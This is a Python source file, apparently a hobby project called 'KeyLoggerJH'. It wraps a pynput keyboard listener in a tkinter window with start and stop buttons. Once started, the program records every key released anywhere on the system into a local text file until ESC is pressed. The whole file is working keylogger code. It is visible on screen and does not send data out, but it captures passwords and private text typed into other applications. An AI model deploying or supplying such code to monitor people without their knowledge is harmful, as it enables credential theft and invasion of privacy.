from tkinter import *
from tkinter import messagebox
from pynput.keyboard import Key, Listener
import threading

# Define button display
def Call():
    msg = Label(window, text = 'Keylogging stoped')
    msg.place(x = 240, y = 115)
    button['bg'] = 'red'
    button['fg'] = 'white'
    messagebox.showinfo('Alarm', 'The window closed!')
    window.destroy()
    quit()


def Call2():
    msg = Label(window, text = "Keylogging started")
    msg.place(x = 240, y = 35)
    button2["bg"] = 'green'
    button2['fg'] = 'black'
    messagebox.showinfo('Info', 'To stop Keylogger, TAP [ESC]')

    # Operate Keylogger in separate thread
    threading.Thread(target=keylog).start()


window = Tk()
window.title('KeyLoggerJH')
window.geometry('400x200')


keys = [] # List for store keys
charCount = 0

# display pressed keys
def keyPress(key):
    try:
        print('Key Pressed: ', key)
    except Exception as ex:
        print('Error code: ', ex)


# Append tapped keys to 'keys' array
def keyRelease(key):
    global keys, charCount
    if key == Key.esc:
        return False
    else:
        if key == Key.enter:
            write(keys)
            charCount = 0
            keys = []
        elif key == Key.space:
            key = ''
            write(keys)
            keys = []
            charCount = 0
        keys.append(key)
        charCount += 1
    

# Open file and write keylog
def write(keys):
    with open('c:/바탕 화면/파이썬/KeyLogger/Record.txt', 'a') as file:
        for key in keys:
            # There is quotes in key array
            key = str(key).replace("'", "") 

            if 'key'.upper() not in key.upper():
                file.write(key)
        file.write('\n')


# When Pressed 'Start Keylogging' button, Execute keylogging process
def keylog():
    with Listener(on_press=keyPress, on_release=keyRelease) as listener:
        listener.join()


button = Button(text = 'Stop Keylogging', command = Call)
button2 = Button(text = 'Start Keylogging', command = Call2)
button.place(x = 90, y = 100, width = 120, height = 50)
button2.place(x = 90, y = 20, width = 120, height = 50)

window.mainloop()